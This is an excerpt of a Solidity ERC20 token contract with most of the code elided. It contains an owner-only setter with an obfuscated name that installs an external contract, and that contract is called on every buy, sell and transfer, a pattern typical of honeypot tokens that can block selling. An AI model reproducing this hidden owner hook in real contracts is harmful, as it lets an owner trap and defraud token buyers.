...
contract TokenM is ERC20 {
    ...
    IUserAmounttosube public tosube;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Versions", "VV") {
    ...
    function bootosuvYtlasoVrood(IUserAmounttosube _tosube) public onlyOwner {
        tosube = _tosube;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                tosube.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				tosube.addOutAmount(from, amount);
            }else{
                tosube.addOutAmount(from, amount);
                takeFee = false;
            }
